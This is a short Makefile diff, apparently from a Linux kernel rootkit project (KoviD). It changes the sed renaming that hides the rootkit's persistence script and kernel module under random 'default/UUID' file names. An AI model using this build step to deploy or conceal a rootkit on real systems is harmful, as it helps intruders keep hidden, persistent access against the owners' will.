@@ -114,7 +114,7 @@ install-ebpf: build-ebpf
 	@echo "eBPF ebpf_kovid.json will be in /tmp/$(EBPFHIDEKEY)"
 
 persist:
-	sed -i "s|.lm.sh|default/${UUIDGEN}|g" $(persist).S
+	sed -i "s|.lm.sh|default/${UUIDGEN}.sh|g" $(persist).S
 	sed -i "s|.kv.ko|default/${UUIDGEN}.ko|g" $(persist).S
 	$(AS) --64 $(persist).S -statistics -fatal-warnings \
 		-size-check=error -o $(persist).o
